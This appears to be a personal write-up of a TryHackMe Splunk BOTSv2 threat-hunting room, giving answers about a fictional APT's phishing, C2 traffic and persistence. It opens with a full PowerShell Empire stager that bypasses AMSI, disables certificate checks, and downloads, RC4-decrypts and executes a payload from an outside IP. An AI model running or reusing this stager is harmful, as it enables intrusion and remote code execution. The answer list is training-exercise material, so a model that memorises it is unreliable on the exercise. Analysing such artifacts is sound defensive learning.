[.R.E.F.]..A.S.S.e.M.B.l.Y..G.E.t.T.y.p.E.(.'.S.y.s.t.e.m..M.a.n.a.g.e.m.e.n.t..A.u.t.o.m.a.t.i.o.n..A.m.s.i.U.t.i.l.s.'.).|.?.{.$._.}.|.%.{.$._..G.e.T.F.I.e.L.D.(.'.a.m.s.i.I.n.i.t.F.a.i.l.e.d.'.,.'.N.o.n.P.u.b.l.i.c.,.S.t.a.t.i.c.'.)..S.E.T.V.A.l.U.e.(.$.n.U.l.l.,.$.t.R.u.e.).}.;.[.S.y.s.t.e.m..N.E.T..S.e.R.v.i.C.E.P.o.I.n.t.M.A.N.A.G.E.r.].:.:.E.X.P.e.c.t.1.0.0.C.o.n.T.i.N.u.e.=.0.;.$.W.c.=.N.e.w.-.O.b.J.E.C.T..S.Y.S.T.e.M..N.E.T..W.e.B.C.l.I.e.n.t.;.$.u.=.'.M.o.z.i.l.l.a./.5..0..(.W.i.n.d.o.w.s..N.T..6..1.;..W.O.W.6.4.;..T.r.i.d.e.n.t./.7..0.;..r.v.:.1.1..0.)..l.i.k.e..G.e.c.k.o.'.;.[.S.y.s.t.e.m..N.e.t..S.e.r.v.i.c.e.P.o.i.n.t.M.a.n.a.g.e.r.].:.:.S.e.r.v.e.r.C.e.r.t.i.f.i.c.a.t.e.V.a.l.i.d.a.t.i.o.n.C.a.l.l.b.a.c.k..=..{.$.t.r.u.e.}.;.$.W.c..H.e.A.D.e.R.S..A.D.d.(.'.U.s.e.r.-.A.g.e.n.t.'.,.$.u.).;.$.w.c..P.R.o.x.Y.=.[.S.Y.S.t.e.m..N.E.T..W.E.B.R.e.q.u.E.S.t.].:.:.D.E.F.a.U.l.T.W.e.B.P.r.O.x.Y.;.$.W.c..P.r.O.X.y..C.R.e.d.E.n.t.i.a.l.S..=..[.S.Y.s.T.E.M..N.E.T..C.R.e.d.e.N.t.i.A.L.C.a.c.h.E.].:.:.D.e.F.A.u.L.T.N.E.t.W.o.r.k.C.r.e.D.e.N.t.i.a.l.s.;.$.K.=.[.S.Y.s.T.e.m..T.e.X.T..E.n.c.O.D.I.n.g.].:.:.A.S.C.I.I..G.E.T.B.y.t.e.s.(.'.3.8.9.2.8.8.e.d.d.7.8.e.8.e.a.2.f.5.4.9.4.6.d.3.2.0.9.b.1.6.b.8.'.).;.$.R.=.{.$.D.,.$.K.=.$.A.r.G.S.;.$.S.=.0...2.5.5.;.0...2.5.5.|.%.{.$.J.=.(.$.J.+.$.S.[.$._.].+.$.K.[.$._.%.$.K..C.O.u.n.t.].).%.2.5.6.;.$.S.[.$._.].,.$.S.[.$.J.].=.$.S.[.$.J.].,.$.S.[.$._.].}.;.$.D.|.%.{.$.I.=.(.$.I.+.1.).%.2.5.6.;.$.H.=.(.$.H.+.$.S.[.$.I.].).%.2.5.6.;.$.S.[.$.I.].,.$.S.[.$.H.].=.$.S.[.$.H.].,.$.S.[.$.I.].;.$._.-.b.x.O.R.$.S.[.(.$.S.[.$.I.].+.$.S.[.$.H.].).%.2.5.6.].}.}.;.$.w.c..H.e.a.D.E.R.s..A.d.D.(.".C.o.o.k.i.e.".,.".s.e.s.s.i.o.n.=.w.I.n.U.2.U.b.W.v.d./.S.d.O.j.j.V.t.a.0.B.H.a.Z.H.j.I.=.".).;.$.s.e.r.=.'.h.t.t.p.s.:././.4.5..7.7..6.5..2.1.1.:.4.4.3.'.;.$.t.=.'./.l.o.g.i.n./.p.r.o.c.e.s.s..p.h.p.'.;.$.D.a.T.A.=.$.W.C..D.o.w.N.l.o.A.d.D.A.T.A.(.$.s.E.r.+.$.T.).;.$.i.v.=.$.D.a.T.A.[.0...3.].;.$.d.A.t.a.=.$.d.a.t.a.[.4...$.d.a.t.A..l.e.n.G.T.H.].;.-.j.O.i.N.[.C.h.A.r.[.].].(.&..$.R..$.d.A.T.A..(.$.I.V.+.$.K.).).|.I.E.X.

/process.php

```

A Federal law enforcement agency reports that Taedonggang often spear phishes its victims with zip files that have to be opened with a password. What is the name of the attachment sent to Frothly by a malicious Taedonggang actor?
*invoice.zip*

What is the password to open the zip file?
*912345678*

The Taedonggang APT group encrypts most of their traffic with SSL. What is the "SSL Issuer" that they use for the majority of their traffic? Answer guidance: Copy the field exactly, including spaces.
*C = US*

What unusual file (for an American company) does winsys32.dll cause to be downloaded into the Frothly environment?
*나는_데이비드를_사랑한다.hwp*

What is the first and last name of the poor innocent sap who was implicated in the metadata of the file that executed PowerShell Empire on the first victim's workstation? Answer example: John Smith

*Ryan Kovar*

![[Pasted image 20220906145242.png]]
Within the document, what kind of points is mentioned if you found the text?
*CyberEastEgg*

To maintain persistence in the Frothly network, Taedonggang APT configured several Scheduled Tasks to beacon back to their C2 server. What single webpage is most contacted by these Scheduled Tasks? Answer example: index.php or images.html
(Focus on Registry related keywords to figure out how to expand your query.)
*process.php*

### Conclusion 

In this room, you navigated through the Splunk Boss of the Soc 2 (BOTS2) competition dataset to increase our capabilities using Splunk. 

The 500 series questions were intentionally omitted from this room as the questions didn't go with the theme of the APT hunt. 

You're encouraged to download the dataset into a local Splunk instance and give it a go at the other questions within the dataset. 

Below is additional data from the Advanced Hunting APTs with Splunk app under Supplemental Material. 

Taedonggang Diamond Model

What is the Diamond Model? Read more about this [here](http://www.activeresponse.org/wp-content/uploads/2013/07/diamond.pdf). 

![](https://assets.tryhackme.com/additional/splunk-overview/splunk-diamond-model.png)

MITRE ATT&CK Techniques Used

What is MITRE ATT&CK? Visit the MITRE room to learn more. 

![](https://assets.tryhackme.com/additional/splunk-overview/splunk-mitre-attack.png)


You leveled up your Splunk-fu thanks to the BOTSv2 dataset.
*No answer needed*

[[Splunk 101]]